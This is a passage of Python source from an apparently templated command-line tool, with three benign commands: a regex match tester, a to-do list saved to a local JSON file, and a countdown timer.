def cmd_regex_tester(ctx):
    pattern = ctx["ask"]("Regex pattern")
    text = ctx["ask"]("Test text", "")
    if not pattern:
        return
    try:
        rgx = re.compile(pattern)
    except re.error as exc:
        ctx["console"].print(f"[{ctx['theme'].danger}]Invalid regex: {exc}[/]")
        return
    matches = list(rgx.finditer(text))
    if not matches:
        ctx["console"].print("[yellow]No matches.[/]")
        return
    rows = [(m.group(0), m.start(), m.end()) for m in matches]
    _print_table(ctx, rows, ("Match", "Start", "End"))


def cmd_todo(ctx):
    path = os.path.expanduser("~/.{{COMMAND_NAME}}_todos.json")
    items = []
    if os.path.isfile(path):
        try:
            items = json.loads(open(path, encoding="utf-8").read())
        except (OSError, json.JSONDecodeError):
            items = []
    action = ctx["choose"]("Action", ["Add", "List", "Complete", "Clear all"]) or "List"
    if action == "Add":
        task = ctx["ask"]("New task")
        if task:
            items.append({"task": task, "done": False, "id": uuid.uuid4().hex[:8], "ts": _dt.datetime.utcnow().isoformat()})
            open(path, "w", encoding="utf-8").write(json.dumps(items, indent=2))
    elif action == "List":
        rows = [(it["id"], "[x]" if it["done"] else "[ ]", it["task"]) for it in items]
        _print_table(ctx, rows, ("ID", "Done", "Task"))
    elif action == "Complete":
        target = ctx["ask"]("Task ID")
        for it in items:
            if it["id"] == target:
                it["done"] = True
        open(path, "w", encoding="utf-8").write(json.dumps(items, indent=2))
    else:
        items = []
        open(path, "w", encoding="utf-8").write("[]")


def cmd_timer(ctx):
    seconds = int(ctx["ask"]("Seconds", "60"))
    end = time.time() + seconds
    try:
        while time.time() < end:
            remaining = int(end - time.time())
            ctx["console"].print(f"\r[{ctx['theme'].primary}]{remaining:>4}s remaining[/]", end="")
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    ctx["console"].print("\n[bold]Time's up![/]")


